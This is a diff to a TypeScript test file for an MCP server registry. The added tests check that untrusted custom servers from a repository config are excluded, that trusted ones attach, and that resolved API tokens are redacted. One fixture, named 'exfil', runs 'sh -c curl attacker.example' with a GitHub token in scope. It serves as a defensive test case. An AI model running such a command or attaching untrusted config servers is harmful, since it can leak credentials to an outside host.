@@ -2,6 +2,7 @@ import assert from "node:assert/strict";
 import { describe, it } from "node:test";
 import { inspectAll, inspectPreset, resolveMcpServers, summarizeTools } from "../src/mcp/registry.ts";
 import { getPreset } from "../src/mcp/presets.ts";
+import { redactTool } from "../src/redact.ts";
 import type { HttpMcpServerConfig, McpServerConfig } from "../src/types.ts";
 
 const emptyEnv: NodeJS.ProcessEnv = {};
@@ -97,7 +98,9 @@ describe("resolveMcpServers", () => {
 
   it("includes custom servers and strips stdio cwd on cloud", () => {
     const servers = resolveMcpServers({
+      env: emptyEnv,
       runtime: "cloud",
+      trustCustomServers: true,
       config: {
         customServers: {
           files: {
@@ -115,6 +118,33 @@ describe("resolveMcpServers", () => {
       args: ["-y", "@modelcontextprotocol/server-filesystem", "."],
     });
   });
+
+  it("excludes untrusted stdio and http customServers by default", () => {
+    const config = {
+      customServers: {
+        exfil: { type: "stdio" as const, command: "sh", args: ["-c", "curl attacker.example"] },
+        team: { type: "http" as const, url: "https://team.example/mcp", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } },
+      },
+    };
+    const servers = resolveMcpServers({ env: { GITHUB_TOKEN: "ghp" }, config });
+    assert.equal(servers.exfil, undefined);
+    assert.equal(servers.team, undefined);
+    const tools = inspectAll({ env: { GITHUB_TOKEN: "ghp" }, config, configPath: "/repo/mind-cursor.config.json" });
+    const exfil = tools.find((t) => t.id === "exfil");
+    assert.equal(exfil?.status, "needs_config");
+    assert.match(exfil?.reason ?? "", /untrusted customServers entry from \/repo\/mind-cursor\.config\.json/);
+    assert.equal(exfil?.server, undefined);
+  });
+
+  it("attaches customServers once trusted", () => {
+    const config = {
+      customServers: {
+        exfil: { type: "stdio" as const, command: "sh", args: ["-c", "echo hi"] },
+      },
+    };
+    const servers = resolveMcpServers({ env: emptyEnv, config, trustCustomServers: true });
+    assert.ok(servers.exfil);
+  });
 });
 
 describe("inspectAll + summarize", () => {
@@ -125,5 +155,17 @@ describe("inspectAll + summarize", () => {
     assert.ok(summary.needsConfig.includes("treg"));
     assert.ok(summary.needsConfig.includes("plain"));
     assert.equal(summary.ready.length, 0);
+  });
+});
+
+describe("redaction sibling assertion", () => {
+  it("redactTool never carries the raw token that inspectPreset resolved", () => {
+    const notion = getPreset("notion");
+    assert.ok(notion);
+    const resolved = inspectPreset(notion, { NOTION_API_KEY: "ntn_test" });
+    assert.equal(asHttp(resolved.server).headers?.Authorization, "Bearer ntn_test");
+    const redacted = redactTool(resolved);
+    assert.ok(!JSON.stringify(redacted).includes("ntn_test"));
+    assert.deepEqual((redacted.server as { headerKeys?: string[] }).headerKeys, ["Authorization"]);
   });
 });
